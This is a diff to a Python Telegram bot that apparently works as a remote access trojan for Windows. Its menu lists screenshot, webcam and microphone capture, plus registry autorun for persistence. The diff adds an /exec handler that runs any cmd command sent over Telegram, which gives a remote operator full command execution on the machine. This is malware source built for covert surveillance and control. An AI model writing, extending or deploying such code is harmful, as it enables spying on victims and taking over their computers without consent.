@@ -29,6 +29,7 @@ async def support(message: types.Message):
                          f'/screen - Desktop screenshot\n'
                          f'/webcam_screen - Webcam screen\n'
                          f'/audio n - (n - count of seconds)Record sound from voice recorder for 5 seconds by default\n'
+                         f'/exec c - (c - command) Execute command in cmd\n'
                          f'/reg_autorun - Append programme to registry\n'
                          f'/del_autorun - Delete programme from registry\n'
                          f'/exit - Shutting down the program before reboot\n')
@@ -112,6 +113,15 @@ async def send_audio(message: types.Message):
         audio_path = module.AudioRecording().recording()
     await message.answer_audio(open(audio_path, "rb"))
     os.remove(audio_path)
+
+
+@dp.message_handler(commands="exec")
+async def cmd_exec(message: types.Message):
+    if len(message.text.split(" ")) >= 2:
+        command = " ".join(message.text.split(" ")[1:])
+        module.Shell.exec_command(command)
+    else:
+        await message.answer("Write your command")
 
 
 @dp.message_handler(commands="exit")
